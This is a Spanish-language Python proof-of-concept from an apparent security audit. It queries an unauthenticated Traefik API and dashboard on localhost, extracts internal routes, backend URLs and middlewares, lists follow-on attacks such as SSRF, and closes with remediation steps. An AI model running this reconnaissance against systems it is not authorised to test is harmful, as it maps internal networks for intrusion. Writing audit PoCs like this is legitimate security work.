#!/usr/bin/env python3
"""
PoC #3: Traefik Dashboard Sin Autenticación
============================================
Vulnerabilidad: docker-compose.yml línea 7
--api.insecure=true expone el dashboard de Traefik sin autenticación

Impacto:
- Exposición de toda la topología de red interna
- Visualización de todos los servicios backend
- Información de rutas, middlewares y configuraciones
- Posible manipulación de rutas en tiempo real
- Reconocimiento completo para ataques posteriores

CVSS: 7.5 (Alto)
CWE-306: Missing Authentication for Critical Function
"""

import requests
import json
import sys

# Configuración
TRAEFIK_DASHBOARD = "http://localhost:8080"


def exploit_traefik_api():
    """Explota la API insegura de Traefik"""
    print("=" * 70)
    print("PoC #3: Traefik Dashboard - Exposición de Información")
    print("=" * 70)
    print(f"\n[*] Objetivo: {TRAEFIK_DASHBOARD}")
    print("[*] Accediendo a la API de Traefik sin autenticación...\n")

    # Endpoints de la API de Traefik
    api_endpoints = {
        "/api/overview": "Resumen general del sistema",
        "/api/http/routers": "Routers HTTP (rutas configuradas)",
        "/api/http/services": "Servicios backend",
        "/api/http/middlewares": "Middlewares de seguridad",
        "/api/entrypoints": "Puntos de entrada de red",
        "/api/version": "Versión de Traefik",
        "/api/rawdata": "Datos crudos de configuración",
    }

    exposed_data = {}

    for endpoint, description in api_endpoints.items():
        try:
            url = f"{TRAEFIK_DASHBOARD}{endpoint}"
            response = requests.get(url, timeout=5)

            if response.status_code == 200:
                print(f"[+] ACCESIBLE: {endpoint}")
                print(f"    Descripción: {description}")

                data = response.json()
                exposed_data[endpoint] = data

                # Mostrar información sensible
                if "routers" in endpoint and isinstance(data, dict):
                    for router_name, router_info in list(data.items())[:3]:
                        print(f"    -> Router: {router_name}")
                        if "rule" in router_info:
                            print(f"       Regla: {router_info['rule']}")
                        if "service" in router_info:
                            print(f"       Servicio: {router_info['service']}")

                elif "services" in endpoint and isinstance(data, dict):
                    for svc_name, svc_info in list(data.items())[:3]:
                        print(f"    -> Servicio: {svc_name}")
                        if "loadBalancer" in svc_info:
                            servers = svc_info["loadBalancer"].get("servers", [])
                            for server in servers[:2]:
                                print(f"       Backend: {server.get('url', 'N/A')}")

                elif "entrypoints" in endpoint and isinstance(data, dict):
                    for ep_name, ep_info in data.items():
                        addr = ep_info.get("address", "N/A")
                        print(f"    -> {ep_name}: {addr}")

                print()
            else:
                print(f"[-] No accesible: {endpoint} (HTTP {response.status_code})")

        except requests.exceptions.ConnectionError:
            print(f"[-] Error de conexión: {endpoint}")
        except Exception as e:
            print(f"[-] Error en {endpoint}: {e}")

    return exposed_data


def analyze_network_topology(data):
    """Analiza la topología de red expuesta"""
    print("\n" + "-" * 70)
    print("ANÁLISIS DE TOPOLOGÍA DE RED")
    print("-" * 70)

    internal_services = []
    middlewares = []

    # Extraer servicios
    if "/api/http/services" in data:
        services = data["/api/http/services"]
        print(f"\n[*] Servicios backend descubiertos: {len(services)}\n")

        for name, info in services.items():
            lb = info.get("loadBalancer", {})
            servers = lb.get("servers", [])

            for server in servers:
                url = server.get("url", "")
                print(f"    -> {name}: {url}")
                internal_services.append({"name": name, "url": url})

    # Extraer middlewares (seguridad)
    if "/api/http/middlewares" in data:
        mw_data = data["/api/http/middlewares"]
        print(f"\n[*] Middlewares de seguridad: {len(mw_data)}")

        for name, info in mw_data.items():
            print(f"    -> {name}: {list(info.keys())}")
            middlewares.append(name)

    return internal_services, middlewares


def check_dashboard_access():
    """Verifica acceso al dashboard web"""
    print("\n" + "-" * 70)
    print("ACCESO AL DASHBOARD WEB")
    print("-" * 70)

    dashboard_url = f"{TRAEFIK_DASHBOARD}/dashboard/"

    try:
        response = requests.get(dashboard_url, timeout=5)

        if response.status_code == 200:
            print(f"\n[+] DASHBOARD ACCESIBLE SIN AUTENTICACIÓN")
            print(f"    URL: {dashboard_url}")
            print(f"    Status: {response.status_code}")
            print("\n[!] El atacante puede ver:")
            print("    - Todos los servicios en tiempo real")
            print("    - Estado de health checks")
            print("    - Métricas y logs")
            print("    - Configuración de red completa")
            return True
        else:
            print(f"[-] Dashboard no accesible: HTTP {response.status_code}")
            return False

    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def generate_attack_vectors(services, middlewares):
    """Genera vectores de ataque basados en la información recolectada"""
    print("\n" + "-" * 70)
    print("VECTORES DE ATAQUE IDENTIFICADOS")
    print("-" * 70)

    print("""
    [*] Basado en la información expuesta, un atacante puede:

    1. MAPEO DE RED INTERNO
       - Identificar todos los servicios backend
       - Conocer IPs y puertos internos
       - Entender la arquitectura de microservicios

    2. IDENTIFICACIÓN DE OBJETIVOS
       - Bases de datos expuestas internamente
       - APIs sin autenticación
       - Servicios con vulnerabilidades conocidas

    3. BYPASS DE SEGURIDAD
       - Identificar middlewares de seguridad
       - Encontrar rutas sin protección
       - Detectar misconfigurations

    4. ATAQUES DIRIGIDOS
       - SSRF a servicios internos descubiertos
       - Ataques directos si hay acceso a la red
       - Explotación de servicios específicos
    """)

    if services:
        print("    [!] SERVICIOS INTERNOS PARA ATACAR:")
        for svc in services:
            print(f"        - {svc['name']}: {svc['url']}")


if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║  TRAEFIK EXPLOITATION - SOLO PARA PRUEBAS AUTORIZADAS         ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

    # Verificar conectividad
    try:
        requests.get(TRAEFIK_DASHBOARD, timeout=2)
    except:
        print("[!] ADVERTENCIA: Traefik no parece estar activo")
        print("[!] Ejecute: docker-compose up -d")
        print("[!] Continuando con la demostración...\n")

    # Ejecutar explotación
    exposed_data = exploit_traefik_api()
    check_dashboard_access()

    if exposed_data:
        services, middlewares = analyze_network_topology(exposed_data)
        generate_attack_vectors(services, middlewares)

    print("\n" + "=" * 70)
    print("RESUMEN DEL IMPACTO")
    print("=" * 70)
    print("""
    [!] VULNERABILIDAD: Traefik API Insegura (--api.insecure=true)

    [!] INFORMACIÓN EXPUESTA:
        - Topología completa de red
        - Todos los servicios backend
        - Configuraciones de seguridad
        - Métricas y estado del sistema

    [!] REMEDIACIÓN:
        - Remover --api.insecure=true
        - Implementar autenticación para dashboard
        - Usar Traefik middleware de basicAuth o forwardAuth
        - No exponer puerto 8080 a redes públicas
    """)
